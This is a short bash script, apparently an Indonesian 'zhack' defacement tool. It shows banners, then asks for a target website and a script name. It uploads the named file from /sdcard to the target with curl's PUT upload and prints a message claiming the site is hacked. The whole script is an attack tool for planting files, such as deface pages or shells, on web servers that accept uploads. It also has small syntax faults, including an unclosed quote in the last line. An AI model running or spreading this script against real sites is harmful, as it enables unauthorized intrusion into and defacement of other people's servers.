clear
cowsay -f eyes 'zhack' | lolcat
figlet -f eyes 'zhack' | lolcat
read -p "Masukkan Web Target => "target;
read -p "Masukkan Nama Script => "sc;
curl -T /sdcard/$sc $target
echo "[!] Terhack => $target/$sc

